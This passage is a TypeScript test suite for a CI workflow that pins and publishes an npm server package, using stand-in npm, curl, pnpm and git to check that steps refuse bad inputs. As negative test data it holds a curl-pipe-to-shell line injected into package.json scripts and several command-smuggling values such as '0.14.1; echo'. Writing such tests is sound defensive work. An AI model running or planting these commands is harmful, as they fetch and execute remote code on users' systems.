test('the pr job pushes and opens nothing when a value it was given is not valid', () => {
  const cases: Array<[string, Record<string, string>]> = [
    ['the committed digest is empty', { COMMITTED: '' }],
    ['the rebuilt digest is not hex', { REBUILT: `${DIGEST_B.slice(1)}g` }],
    ['the version is empty', { VERSION: '' }],
    ['the version is not x.y.z', { VERSION: '3.0.1; echo' }],
    ['hold is empty', { HOLD: '' }],
    ['hold is neither true nor false', { HOLD: 'yes' }],
    ['a held refresh has no reasons', { HOLD: 'true', REASONS: '' }],
    ['the server is empty', { SERVER: '' }],
    ['the server is not x.y.z', { SERVER: '0.14.1; echo' }],
    ['changed is empty', { CHANGED: '' }],
    ['changed is neither true nor false', { CHANGED: 'yes' }],
  ];
  for (const [what, override] of cases) {
    const run = runPr({}, { ...PR_ENV, ...override });
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.deepEqual(run.calls, [], `the step ran ${run.calls.map((call) => call.command).join(', ')} when ${what}`);
  }
});

test('the wait reads nothing when a value propose handed on, or one of its bounds, is not valid', () => {
  const good = { ...PR_ENV, GH_TOKEN: GITHUB_TOKEN, NUMBER: '12', HEAD: HEAD_SHA };
  const cases: Array<[string, Record<string, string>]> = [
    ['the number is empty', { NUMBER: '' }],
    ['the number is not a whole number', { NUMBER: '12; echo' }],
    ['the head is empty', { HEAD: '' }],
    ['the head is short', { HEAD: HEAD_SHA.slice(1) }],
    ['the head is uppercase', { HEAD: HEAD_SHA.toUpperCase() }],
    ['the head has a second line', { HEAD: `${HEAD_SHA}\n${OTHER_SHA}` }],
    ['the version is not x.y.z', { VERSION: '3.0.1; echo' }],
    ['the poll interval is not a whole number', { POLL_SECONDS: 'x' }],
    ['the deadline is negative', { MERGE_DEADLINE_SECONDS: '-1' }],
    ['the retry pause is not a whole number', { RETRY_SECONDS: '1.5' }],
    ['changed is empty', { CHANGED: '' }],
    ['changed is neither true nor false', { CHANGED: 'yes' }],
  ];
  const script = stepScript(workflow(), 'wait');
  const valid = runStep(script, { commands: { gh: fakeGh({}) }, env: good });
  assert.equal(valid.status, 0, valid.log);
  for (const [what, override] of cases) {
    const run = runStep(script, { commands: { gh: fakeGh({}) }, env: { ...good, ...override } });
    assert.notEqual(run.status, 0, `the wait passed when ${what}\n${run.log}`);
    assert.deepEqual(run.calls, [], `the wait ran ${run.calls.map((call) => call.command).join(', ')} when ${what}`);
  }
});

/** The server pin in package.json as committed, set to `server`, at package version `version`. */
const manifestWithPin = (server: string, version = '3.2.1'): string => {
  const manifest = manifestAt(version);
  const pinned = manifest.replace(/"@tibia\.sh\/tibiawiki-mcp": "[^"]*"/, `"@tibia.sh/tibiawiki-mcp": "${server}"`);
  assert.ok(pinned.includes(`"@tibia.sh/tibiawiki-mcp": "${server}"`), 'package.json names no server to pin');
  return pinned;
};

/** A lockfile's stand-in text. The pin steps only hash it, and the stand-in pnpm appends to it. */
const LOCK = "lockfileVersion: '9.0'\n";

/** The real scripts/server-pin.ts, which the pin step and the pr job's check run with the real node. */
const serverPinScript = (): string => readFileSync(new URL('../scripts/server-pin.ts', import.meta.url), 'utf8');

const sha256 = (text: string): string => createHash('sha256').update(text).digest('hex');

/** The tarball npm lists for server `version`, which the pin step waits for. */
const tarballOf = (version: string): string => `https://registry.npmjs.org/@tibia.sh/tibiawiki-mcp/-/tibiawiki-mcp-${version}.tgz`;

/**
 * Stand-in JavaScript for a command that answers each call of one kind with the next of `answers`, the last one
 * repeated, counting its calls in RUNNER_TEMP/`counter`. An answer of E404 prints npm's error and exits 1.
 */
const inTurn = (counter: string, answers: string[]): string =>
  `const fs = require('node:fs');\n` +
  `const file = process.env.RUNNER_TEMP + '/${counter}';\n` +
  `const count = fs.existsSync(file) ? Number(fs.readFileSync(file, 'utf8')) : 0;\n` +
  `fs.writeFileSync(file, String(count + 1));\n` +
  `const answers = ${JSON.stringify(answers)};\n` +
  `const answer = answers[Math.min(count, answers.length - 1)];\n` +
  `if (answer === 'E404') { process.stderr.write('npm error code E404\\n'); process.exitCode = 1; }\n` +
  `else process.stdout.write(answer);\n`;

/**
 * A stand-in npm for the pin step. `npm view @tibia.sh/tibiawiki-mcp version` prints `latest` and exits `latestExit`,
 * and each view of a version's tarball prints the next of `listed`. Any other call fails.
 */
const fakePinNpm = (latest: string, listed: string[], latestExit = 0): string =>
  `const args = process.argv.slice(2);\n` +
  `if (args.join(' ') === 'view @tibia.sh/tibiawiki-mcp version') { process.stdout.write(${JSON.stringify(latest)}); process.exitCode = ${latestExit}; }\n` +
  `else if (args.length === 3 && args[0] === 'view' && /^@tibia\\.sh\\/tibiawiki-mcp@\\d+\\.\\d+\\.\\d+$/.test(args[1]) && args[2] === 'dist.tarball') {\n` +
  inTurn('views', listed) +
  `} else { process.stderr.write('the stand-in npm does not answer this call\\n'); process.exitCode = 98; }\n`;

/** A stand-in curl that prints each HEAD's status code in turn, as `--write-out '%{http_code}'` does. */
const fakeCurl = (statuses: string[]): string => inTurn('heads', statuses);

/** A stand-in pnpm whose add pins the server at the version it names, in package.json and the lockfile, or does nothing. */
const fakePinPnpm = (pins = true): string => pins
  ? String.raw`const fs = require('node:fs');
const spec = process.argv.at(-1);
const version = spec.slice('@tibia.sh/tibiawiki-mcp@'.length);
fs.writeFileSync('package.json', fs.readFileSync('package.json', 'utf8').replace(/"@tibia\.sh\/tibiawiki-mcp": "[^"]*"/, '"@tibia.sh/tibiawiki-mcp": "' + version + '"'));
fs.appendFileSync('pnpm-lock.yaml', 'server: ' + version + '\n');
`
  : '';

type PinScenario = {
  event?: string;
  requested?: string;
  pin?: string;
  latest?: string;
  latestExit?: number;
  listed?: string[];
  heads?: string[];
  pins?: boolean;
  env?: Record<string, string>;
};

/** Runs the build job's pin step in a checkout that pins `pin`, against a stand-in npm, curl and pnpm. */
const runPin = ({ event = 'schedule', requested = '', pin = '0.13.1', latest = '0.13.1\n', latestExit = 0, listed = ['E404'], heads = ['200'], pins = true, env = {} }: PinScenario = {}) =>
  runStep(stepScript(workflow(), 'pin'), {
    files: { 'package.json': manifestWithPin(pin), 'pnpm-lock.yaml': LOCK, 'scripts/server-pin.ts': serverPinScript() },
    commands: { npm: fakePinNpm(latest, listed, latestExit), curl: fakeCurl(heads), pnpm: fakePinPnpm(pins) },
    env: { EVENT: event, REQUESTED: requested, POLL_SECONDS: '0', DEADLINE_SECONDS: '60', ...env },
  });

/** What the pin step hands on for a checkout that ends with `manifest` and `lock`. */
const pinOutput = (server: string, moved: boolean, manifest: string, lock: string): string =>
  `server=${server}\npin_moved=${moved}\npackage_json_sha256=${sha256(manifest)}\npnpm_lock_sha256=${sha256(lock)}\n`;

const commandsOf = (calls: Call[]): string[] => calls.map((call) => call.command);

test('the pin step runs right after the install, before the generator, and holds no token', () => {
  const list = steps(buildJob());
  const pin = stepIndex(list, 'pin');
  const setup = list.findIndex((step) => /uses: *pnpm\/setup@/.test(step));
  const build = list.findIndex((step) => /\bpnpm build-index\b/.test(step));
  assert.equal(pin, setup + 1, 'the pin step is not the first step after the install');
  assert.ok(pin < build, 'the pin step runs after pnpm build-index');
  assert.equal(scalar(stepBody(list[pin]!), 'name'), 'Pin the server');
  assert.equal(stepIf(list[pin]!), undefined, 'the pin step runs only sometimes');
  // The payload reaches the script through env alone, and no credential does.
  assert.deepEqual(sortedLines(under(stepBody(list[pin]!), 'env')), [
    'EVENT: ${{ github.event_name }}',
    'REQUESTED: ${{ github.event.client_payload.version }}',
  ], 'the pin step gets more than the event and the version it asks for');
  assert.doesNotMatch(list[pin]!, /\bsecrets\b|\bgithub\.token\b|\bsteps\.token\b|_TOKEN\b/, 'the pin step holds a token');
  assert.ok(stepScript(workflow(), 'pin').split('\n').some((line) => line.trim() === PIN_ADD), `the pin step does not run ${PIN_ADD}`);
});

test('the pin step keeps the pin when npm lists nothing newer, and hands on the hashes of the manifests', () => {
  const run = runPin();
  assert.equal(run.status, 0, run.log);
  assert.equal(run.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK));
  assert.deepEqual(run.calls, [{ command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp', 'version'] }]);
  assert.equal(run.checkout['package.json'], manifestWithPin('0.13.1'), 'package.json changed');
  // A version from anything but a server-release dispatch is not asked for.
  const byHand = runPin({ event: 'workflow_dispatch', requested: '9.9.9' });
  assert.equal(byHand.status, 0, byHand.log);
  assert.equal(byHand.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK));
});

test('on its schedule, the pin step moves the pin to the latest server once npm serves its tarball', () => {
  const run = runPin({ latest: '0.14.1\n', listed: [`${tarballOf('0.14.1')}\n`] });
  assert.equal(run.status, 0, run.log);
  const manifest = manifestWithPin('0.14.1');
  const lock = `${LOCK}server: 0.14.1\n`;
  assert.equal(run.checkout['package.json'], manifest, 'package.json does not pin 0.14.1');
  assert.equal(run.output, pinOutput('0.14.1', true, manifest, lock), 'the hashes are not those of the manifests pnpm add left');
  assert.deepEqual(run.calls, [
    { command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp', 'version'] },
    { command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp@0.14.1', 'dist.tarball'] },
    { command: 'curl', args: ['--silent', '--head', '--output', '/dev/null', '--write-out', '%{http_code}', '--max-time', '30', tarballOf('0.14.1')] },
    { command: 'pnpm', args: ['add', '-D', '--save-exact', '@tibia.sh/tibiawiki-mcp@0.14.1'] },
  ]);
});

test('on a server-release dispatch, the pin step waits for npm to list the version and serve its tarball, then pins it', () => {
  // npm does not know the version at first, then lists it before its tarball answers.
  const run = runPin({ event: 'repository_dispatch', requested: '0.15.0', latest: '0.14.1\n', listed: ['E404', '', `${tarballOf('0.15.0')}\n`], heads: ['404', '200'] });
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(commandsOf(run.calls), ['npm', 'npm', 'npm', 'npm', 'curl', 'npm', 'curl', 'pnpm']);
  assert.deepEqual(run.calls.at(-1), { command: 'pnpm', args: ['add', '-D', '--save-exact', '@tibia.sh/tibiawiki-mcp@0.15.0'] });
  assert.equal(stepOutputs(run.output)['server'], '0.15.0');
  assert.equal(stepOutputs(run.output)['pin_moved'], 'true');
});

test('a server-release dispatch at or below the pin keeps it, and ends the step green', () => {
  for (const requested of ['0.13.1', '0.12.0', '0.9.9']) {
    const run = runPin({ event: 'repository_dispatch', requested, latest: '0.14.1\n' });
    assert.equal(run.status, 0, run.log);
    assert.equal(run.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK), `the dispatch of ${requested} moved the pin`);
    assert.deepEqual(commandsOf(run.calls), ['npm'], `the dispatch of ${requested} waited for npm or ran pnpm`);
  }
  const refused = runPin({ event: 'repository_dispatch', requested: '0.12.0' });
  assert.match(refused.log, /^::notice::.*0\.12\.0.*0\.13\.1/m, 'a refused dispatch does not say so');
});

test('the pin step asks npm nothing when a server-release dispatch names no x.y.z version', () => {
  for (const requested of ['', '0.15', '0.15.0\n', '0.15.0; echo', 'v0.15.0', ' 0.15.0', '0.15.0-rc.1', 'latest']) {
    const run = runPin({ event: 'repository_dispatch', requested, latest: '0.14.1\n' });
    assert.notEqual(run.status, 0, `the step passed on the version ${JSON.stringify(requested)}\n${run.log}`);
    assert.deepEqual(run.calls, [], `the step ran ${commandsOf(run.calls).join(', ')} on the version ${JSON.stringify(requested)}`);
    assert.equal(run.output, '', `the step handed something on for the version ${JSON.stringify(requested)}`);
  }
});

test('the pin step pins nothing when npm does not serve the version by the deadline', () => {
  const cases: Array<[string, PinScenario]> = [
    ['npm never lists the version', { listed: ['E404'] }],
    ['npm lists another tarball', { listed: [`${tarballOf('0.14.1').replace('registry.npmjs.org', 'registry.example.com')}\n`] }],
    ['the tarball never answers 200', { listed: [`${tarballOf('0.14.1')}\n`], heads: ['404'] }],
  ];
  for (const [what, scenario] of cases) {
    const run = runPin({ latest: '0.14.1\n', ...scenario, env: { DEADLINE_SECONDS: '0' } });
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.ok(!commandsOf(run.calls).includes('pnpm'), `the step ran pnpm when ${what}`);
    assert.equal(run.output, '', `the step handed something on when ${what}`);
    assert.match(run.log, /^::error::npm did not serve server 0\.14\.1 within 0 seconds\.$/m, `the step does not say npm did not serve it when ${what}`);
  }
  const another = runPin({ latest: '0.14.1\n', listed: ['https://registry.example.com/tibiawiki-mcp-0.14.1.tgz\n'], env: { DEADLINE_SECONDS: '0' } });
  assert.ok(!commandsOf(another.calls).includes('curl'), 'the step sent a HEAD to a tarball npm is not meant to list');
});

test('the pin step fails, and hands nothing on, when it cannot decide or pnpm add does not pin the version', () => {
  const cases: Array<[string, PinScenario]> = [
    ['npm cannot read the latest version', { latestExit: 1 }],
    ['npm prints no version as latest', { latest: 'latest\n' }],
    ['npm prints nothing as latest', { latest: '' }],
    ['package.json pins a range', { pin: '^0.13.1' }],
    ['pnpm add leaves the old pin', { latest: '0.14.1\n', listed: [`${tarballOf('0.14.1')}\n`], pins: false }],
    ['the poll interval is not a whole number', { latest: '0.14.1\n', env: { POLL_SECONDS: 'x' } }],
    ['the deadline is negative', { latest: '0.14.1\n', env: { DEADLINE_SECONDS: '-1' } }],
  ];
  for (const [what, scenario] of cases) {
    const run = runPin(scenario);
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.equal(run.output, '', `the step handed something on when ${what}`);
  }
});

/** A stand-in for scripts/schema-diff.ts that checks its arguments, prints `stdout` and exits `exit`. */
const fakeSchemaDiff = (stdout: string, exit = 0): string =>
  `const args = process.argv.slice(2);\n` +
  `if (args.length !== 2 || args[0] !== process.env.RUNNER_TEMP + '/committed.db' || args[1] !== 'index.db') { process.exitCode = 2; }\n` +
  `else { process.stdout.write(${JSON.stringify(stdout)}); process.exitCode = ${exit}; }\n`;

const runSchema = (stdout: string, exit = 0) =>
  runStep(stepScript(workflow(), 'schema'), { files: { 'package.json': '{ "type": "module" }\n', 'scripts/schema-diff.ts': fakeSchemaDiff(stdout, exit) } });

test('the schema level runs after the guard, only when the content changed, on the kept and the rebuilt index', () => {
  const list = steps(buildJob());
  const schema = stepIndex(list, 'schema');
  assert.ok(stepIndex(list, 'guard') < schema, 'the schema level is decided before the guard');
  assert.equal(stepIf(list[schema]!), "${{ steps.digests.outputs.changed == 'true' }}", 'the schema level is not gated on a changed digest');
  assert.ok(stepScript(workflow(), 'schema').includes('node scripts/schema-diff.ts "$RUNNER_TEMP/committed.db" index.db'),
    'the schema level does not compare the kept index with the rebuilt one');
});

test('the schema level is minor when the rebuilt index added a table or a column, and patch otherwise', () => {
  const cases: Array<[string, string]> = [
    ['{"added":["creature.race_id"],"removed":[]}\n', 'minor'],
    ['{"added":["achievement"],"removed":["npc_location"]}\n', 'minor'],
    ['{"added":[],"removed":["creature.race_id"]}\n', 'patch'],
    ['{"added":[],"removed":[]}\n', 'patch'],
  ];
  for (const [diff, level] of cases) {
    const run = runSchema(diff);
    assert.equal(run.status, 0, run.log);
    assert.equal(run.output, `level=${level}\n`, diff);
  }
});

test('the schema level fails, and hands nothing on, when the schemas cannot be compared', () => {
  for (const [what, stdout, exit] of [
    ['the script cannot read an index', '', 1],
    ['the script prints what is not JSON', 'nope\n', 0],
    ['the script prints no lists', '{"added":"creature.race_id"}\n', 0],
    ['the script prints null', 'null\n', 0],
  ] as const) {
    const run = runSchema(stdout, exit);
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.equal(run.output, '', `the step handed on a level when ${what}`);
  }
});

/** The pr job's steps, each named by its id, or by the action it uses when it has none. */
const PR_STEPS = [
  'actions/checkout',
  'actions/setup-node',
  'check',
  'pnpm/setup',
  'recompute',
  'scope',
  'manifests',
  'actions/download-artifact',
  'verify',
  'version',
  'token',
  'propose',
  'wait',
];

const PIN_MOVED_IF = "${{ needs.build.outputs.pin_moved == 'true' }}";

test('the pr job checks what the build job handed on, recomputes the pin and compares it, before anything else', () => {
  const list = steps(prJob());
  assert.deepEqual(list.map((step) => /^ *(?:- +)?id: *(\S+)$/m.exec(step)?.[1] ?? scalar(stepBody(step), 'uses')?.replace(/@.*$/, '')), PR_STEPS);
  const check = prStep('check');
  assert.equal(stepScript(workflow(), 'check'), CHECK_RUN);
  assert.equal(stepIf(check), undefined, 'the check runs only sometimes');
  assert.deepEqual(sortedLines(under(stepBody(check), 'env')), [
    'CHANGED: ${{ needs.build.outputs.changed }}',
    'LEVEL: ${{ needs.build.outputs.level }}',
    'PIN_MOVED: ${{ needs.build.outputs.pin_moved }}',
    'SERVER: ${{ needs.build.outputs.server }}',
  ]);
  for (const [id, script] of [['recompute', RECOMPUTE_RUN], ['scope', SCOPE_RUN], ['manifests', MANIFESTS_RUN]] as const) {
    assert.equal(stepScript(workflow(), id), script, `the ${id} step runs another script`);
    assert.equal(stepIf(prStep(id)), PIN_MOVED_IF, `the ${id} step does not run exactly when the pin moved`);
  }
  assert.deepEqual(sortedLines(under(stepBody(prStep('recompute')), 'env')), ['SERVER: ${{ needs.build.outputs.server }}']);
  assert.deepEqual(sortedLines(under(stepBody(prStep('scope')), 'env')), ['SERVER: ${{ needs.build.outputs.server }}']);
  assert.deepEqual(sortedLines(under(stepBody(prStep('manifests')), 'env')), [
    'PACKAGE_JSON_SHA256: ${{ needs.build.outputs.package_json_sha256 }}',
    'PNPM_LOCK_SHA256: ${{ needs.build.outputs.pnpm_lock_sha256 }}',
  ]);
  // The rebuilt index is taken only when the content changed, after the manifests passed.
  assert.equal(stepIf(prStep('verify')), "${{ needs.build.outputs.changed == 'true' }}", 'the index is taken when the content did not change');
  assert.deepEqual(sortedLines(under(stepBody(prStep('version')), 'env')), [
    'CHANGED: ${{ needs.build.outputs.changed }}',
    'LEVEL: ${{ needs.build.outputs.level }}',
  ]);
  assert.equal(stepScript(workflow(), 'version'), VERSION_RUN, 'the version step runs another script');
  assert.equal(stepIf(prStep('version')), undefined, 'the version step runs only sometimes');
});

test("the pr job's pnpm/setup installs pnpm alone and restores no cache", () => {
  const setups = steps(prJob()).filter((step) => /uses: *pnpm\/setup@/.test(step));
  assert.equal(setups.length, 1, 'expected one pnpm/setup in the pr job');
  assert.deepEqual(sortedLines(stepInputs(setups[0]!)), [`cache-dependency-path: ${PR_NO_CACHE}`, 'install: false'],
    'the pr job sets up pnpm with other inputs than install: false and a cache key on a file that never exists');
  assert.equal(stepIf(setups[0]!), undefined);
});

test(`no file ${PR_NO_CACHE} exists, so the pr job's pnpm/setup finds no lockfile to key a cache on`, () => {
  assert.ok(!existsSync(new URL(`../${PR_NO_CACHE}`, import.meta.url)), `${PR_NO_CACHE} exists`);
});

test('the pr job never downloads the manifests: the artifact is index.db alone, and the pr job takes only it', () => {
  const downloads = steps(prJob()).filter((step) => /uses: *actions\/download-artifact@/.test(step));
  assert.equal(downloads.length, 1, 'expected one download in the pr job');
  assert.deepEqual(sortedLines(stepInputs(downloads[0]!)), ['name: index', 'path: ${{ runner.temp }}/index']);
  const uploads = steps(buildJob()).filter((step) => /uses: *actions\/upload-artifact@/.test(step));
  assert.equal(uploads.length, 1, 'expected one upload in the build job');
  assert.equal(scalar(stepInputs(uploads[0]!), 'path'), 'index.db', 'the artifact holds more than index.db');
  // The two hashes reach the manifests step, and no other step of the pr job.
  const pr = prJob();
  assert.equal(pr.match(/needs\.build\.outputs\.(?:package_json_sha256|pnpm_lock_sha256)/g)?.length, 2, 'another pr job step reads the manifest hashes');
});

/** What the pr job's check reads from its env for a refresh whose content changed and whose pin stayed. */
const CHECK_ENV = { CHANGED: 'true', PIN_MOVED: 'false', LEVEL: 'patch', SERVER: '0.13.1' };

const runCheck = (env: Record<string, string>) =>
  runStep(stepScript(workflow(), 'check'), {
    files: { 'package.json': manifestWithPin('0.13.1'), 'scripts/server-pin.ts': serverPinScript() },
    env,
  });

test("the pr job's check passes what the build job may hand on", () => {
  for (const env of [
    CHECK_ENV,
    { ...CHECK_ENV, LEVEL: 'minor' },
    { ...CHECK_ENV, CHANGED: 'false', PIN_MOVED: 'true', SERVER: '0.14.1' },
    { ...CHECK_ENV, PIN_MOVED: 'true', SERVER: '1.0.0', LEVEL: 'minor' },
  ]) {
    const run = runCheck(env);
    assert.equal(run.status, 0, `${JSON.stringify(env)}\n${run.log}`);
    assert.deepEqual(run.calls, []);
  }
});

test("the pr job's check rejects a level, a pin_moved or a server the build job may not hand on", () => {
  const cases: Array<[string, Record<string, string>]> = [
    ['level is major', { LEVEL: 'major' }],
    ['level is empty', { LEVEL: '' }],
    ['level has a second line', { LEVEL: 'patch\nminor' }],
    ['pin_moved is yes', { PIN_MOVED: 'yes' }],
    ['pin_moved is empty', { PIN_MOVED: '' }],
    ['changed is yes', { CHANGED: 'yes' }],
    ['neither the content nor the pin changed', { CHANGED: 'false' }],
    ['the server is below the pin', { PIN_MOVED: 'true', SERVER: '0.12.0' }],
    ['the server is the pin, though it moved', { PIN_MOVED: 'true' }],
    ['the server is not the pin, though it stayed', { SERVER: '0.14.1' }],
    ['the server is empty', { SERVER: '' }],
    ['the server has a trailing newline', { SERVER: '0.13.1\n' }],
    ['the server is not x.y.z', { PIN_MOVED: 'true', SERVER: '0.14.1; echo' }],
  ];
  for (const [what, override] of cases) {
    const run = runCheck({ ...CHECK_ENV, ...override });
    assert.notEqual(run.status, 0, `the check passed when ${what}\n${run.log}`);
    assert.deepEqual(run.calls, [], `the check ran ${commandsOf(run.calls).join(', ')} when ${what}`);
  }
});

test('the recompute pins the server on the lockfile alone, and runs pnpm on nothing but an x.y.z version', () => {
  const run = runStep(stepScript(workflow(), 'recompute'), { commands: { pnpm: '' }, env: { SERVER: '0.14.1' } });
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(run.calls, [{ command: 'pnpm', args: ['add', '-D', '--save-exact', '--lockfile-only', '--ignore-scripts', '--ignore-pnpmfile', '@tibia.sh/tibiawiki-mcp@0.14.1'] }]);
  for (const server of ['', '0.14', '0.14.1\n', '0.14.1 --global', '0.14.1; echo']) {
    const bad = runStep(stepScript(workflow(), 'recompute'), { commands: { pnpm: '' }, env: { SERVER: server } });
    assert.notEqual(bad.status, 0, `the recompute passed on the server ${JSON.stringify(server)}\n${bad.log}`);
    assert.deepEqual(bad.calls, [], `the recompute ran pnpm on the server ${JSON.stringify(server)}`);
  }
});

/** A stand-in git that lists `names` as changed and prints `main` as main's package.json. */
const fakeScopeGit = (names: string, main: string): string =>
  `const args = process.argv.slice(2);\n` +
  `if (args.join(' ') === 'diff --name-only') process.stdout.write(${JSON.stringify(names)});\n` +
  `else if (args.join(' ') === 'show HEAD:package.json') process.stdout.write(${JSON.stringify(main)});\n` +
  `else { process.stderr.write('the stand-in git does not answer this call\\n'); process.exitCode = 98; }\n`;

const BOTH_MANIFESTS = 'package.json\npnpm-lock.yaml\n';

const runScope = (manifest: string, names = BOTH_MANIFESTS, server = '0.14.1') =>
  runStep(stepScript(workflow(), 'scope'), {
    files: { 'package.json': manifest },
    commands: { git: fakeScopeGit(names, manifestWithPin('0.13.1')) },
    env: { SERVER: server },
  });

test('the diff check passes a recompute that changed only the pin of the server', () => {
  const run = runScope(manifestWithPin('0.14.1'));
  assert.equal(run.status, 0, run.log);
});

test('the diff check rejects a recompute that changed more than the pin of the server', () => {
  const pinned = manifestWithPin('0.14.1');
  const cases: Array<[string, string, string?, string?]> = [
    ['package.json changed its scripts', pinned.replace('"test": "', '"test": "curl https://example.com | sh; ')],
    ['package.json changed another devDependency', pinned.replace(/"typescript": "[^"]*"/, '"typescript": "7.0.3"')],
    ['package.json was reformatted', pinned.replaceAll('  ', '\t')],
    ['package.json pins another server than the one handed on', manifestWithPin('0.14.2')],
    ['package.json pins nothing new', manifestWithPin('0.13.1')],
    ['another file changed too', pinned, `index.db\n${BOTH_MANIFESTS}`],
    ['the lockfile did not change', pinned, 'package.json\n'],
    ['nothing changed', pinned, ''],
  ];
  for (const [what, manifest, names] of cases) {
    const run = runScope(manifest, names);
    assert.notEqual(run.status, 0, `the diff check passed when ${what}\n${run.log}`);
  }
});

const runManifests = (packageJson: string, pnpmLock: string) =>
  runStep(stepScript(workflow(), 'manifests'), {
    files: { 'package.json': manifestWithPin('0.14.1'), 'pnpm-lock.yaml': `${LOCK}server: 0.14.1\n` },
    env: { PACKAGE_JSON_SHA256: packageJson, PNPM_LOCK_SHA256: pnpmLock },
  });

test('the manifests pass only when both hash to what the build job built index.db with', () => {
  const packageJson = sha256(manifestWithPin('0.14.1'));
  const pnpmLock = sha256(`${LOCK}server: 0.14.1\n`);
  const good = runManifests(packageJson, pnpmLock);
  assert.equal(good.status, 0, good.log);
  const cases: Array<[string, string, string]> = [
    ['package.json hashes to another value', sha256(manifestWithPin('0.13.1')), pnpmLock],
    ['pnpm-lock.yaml hashes to another value', packageJson, sha256(LOCK)],
    ['the two hashes are swapped', pnpmLock, packageJson],
    ['the package.json hash is empty', '', pnpmLock],
    ['the lockfile hash is uppercase', packageJson, pnpmLock.toUpperCase()],
    ['the package.json hash is short', packageJson.slice(1), pnpmLock],
    ['the lockfile hash has a second line', packageJson, `${pnpmLock}\n${pnpmLock}`],
  ];
  for (const [what, a, b] of cases) {
    const run = runManifests(a, b);
    assert.notEqual(run.status, 0, `the manifests passed when ${what}\n${run.log}`);
  }
});

test('the version step sets the next minor when the rebuilt index grew its schema', () => {
  const cases: Array<[string, string[], string]> = [
    ['3.2.1', ['3.2.1'], '3.3.0'],
    ['3.2.1', ['3.2.0', '3.2.1', '3.3.0'], '3.4.0'],
    ['3.9.4', ['3.9.4', '3.10.0'], '3.11.0'],
  ];
  for (const [current, versions, next] of cases) {
    const run = runVersion(current, `${JSON.stringify(versions)}\n`, 0, 'minor');
    assert.equal(run.status, 0, `${current} with ${versions.join(', ')} on npm\n${run.log}`);
    assert.equal(run.output, `version=${next}\n`, `${current} with ${versions.join(', ')} on npm`);
    assert.equal(run.checkout['package.json'], manifestAt(next), 'package.json changed in more than its version');
  }
  for (const level of ['major', '']) {
    const run = runVersion('3.2.1', '["3.2.1"]\n', 0, level);
    assert.notEqual(run.status, 0, `the step passed at the level ${JSON.stringify(level)}\n${run.log}`);
    assert.equal(run.output, '', `the step wrote a version at the level ${JSON.stringify(level)}`);
  }
});

/** Runs the version step for a pin-only run in a checkout at 3.2.1, with npm printing `npmStdout` and exiting `npmExit`. */
const runPinOnlyVersion = (npmStdout: string, npmExit = 0) =>
  runStep(stepScript(workflow(), 'version'), {
    files: { 'package.json': manifestWithPin('0.14.1', '3.2.1') },
    commands: { npm: `process.stdout.write(${JSON.stringify(npmStdout)});\nprocess.exitCode = ${npmExit};\n` },
    env: { CHANGED: 'false', LEVEL: 'patch' },
  });

test('a pin-only run of the version step keeps the version when npm lists it already', () => {
  // Kept, the version publishes nothing once merged, because release.yml finds it on npm.
  for (const versions of [['3.2.0', '3.2.1'], ['3.2.1', '3.2.2']]) {
    const run = runPinOnlyVersion(`${JSON.stringify(versions)}\n`);
    assert.equal(run.status, 0, `${versions.join(', ')} on npm\n${run.log}`);
    assert.equal(run.output, 'version=3.2.1\n');
    assert.deepEqual(run.calls, [{ command: 'npm', args: ['view', '@tibia.sh/tibiawiki-data', 'versions', '--json'] }]);
    assert.equal(run.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'), 'package.json changed');
    assert.match(run.log, /the version stays 3\.2\.1, which npm lists, and nothing is published/);
  }
});

test('a pin-only run of the version step fails, and sets no version, when npm does not list it or cannot be read', () => {
  // Merged with a version npm lacks, the push to main would start release.yml, and that would publish it.
  const cases: Array<[string, string, number]> = [
    ['npm does not list the version from package.json', '["3.2.0"]\n', 0],
    ['npm lists only a prerelease of it', '["3.2.0", "3.2.1-rc.1"]\n', 0],
    ['npm cannot read the registry', '', 1],
    ['npm prints nothing', '', 0],
    ['npm prints an empty list', '[]\n', 0],
    ['npm prints something other than a list', '"3.2.1"\n', 0],
    ['npm prints what is not JSON', 'npm error\n', 0],
  ];
  for (const [what, npmStdout, npmExit] of cases) {
    const run = runPinOnlyVersion(npmStdout, npmExit);
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.equal(run.output, '', `the step wrote a version when ${what}`);
    assert.equal(run.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'), `package.json changed when ${what}`);
  }
  const missing = runPinOnlyVersion('["3.2.0"]\n');
  assert.match(missing.log, /npm does not list 3\.2\.1 from package\.json yet\. Let its release finish, or fix it, then run drift again\./,
    'the step does not say npm lacks the version and what to do');
});

test('the version step checks changed and level itself', () => {
  for (const [changed, level] of [['', 'patch'], ['yes', 'patch'], ['false', 'major'], ['false', '']]) {
    const run = runStep(stepScript(workflow(), 'version'), {
      files: { 'package.json': manifestWithPin('0.14.1', '3.2.1') },
      commands: { npm: `process.stdout.write('["3.2.1"]\\n');\n` },
      env: { CHANGED: changed!, LEVEL: level! },
    });
    assert.notEqual(run.status, 0, `the step passed with changed=${JSON.stringify(changed)} and level=${JSON.stringify(level)}\n${run.log}`);
    assert.equal(run.output, '');
  }
});

test('a pin-only run whose version npm does not list stops at the version step, before propose', () => {
  // As the runner chains them: the version step fails, so propose, which needs its version, never runs.
  const version = runStep(stepScript(workflow(), 'version'), {
    files: { 'package.json': manifestWithPin('0.14.1', '3.2.1'), 'pnpm-lock.yaml': `${LOCK}server: 0.14.1\n` },
    commands: { npm: `process.stdout.write('["3.2.0"]\\n');\n` },
    env: { CHANGED: 'false', LEVEL: 'patch' },
  });
  assert.notEqual(version.status, 0, `the version step passed with 3.2.1 missing from npm\n${version.log}`);
  assert.equal(stepOutputs(version.output)['version'], undefined, 'the version step handed propose a version');
  // propose refuses the empty version the runner would give it, before git or gh.
  const propose = runStep(stepScript(workflow(), 'propose'), {
    files: version.checkout,
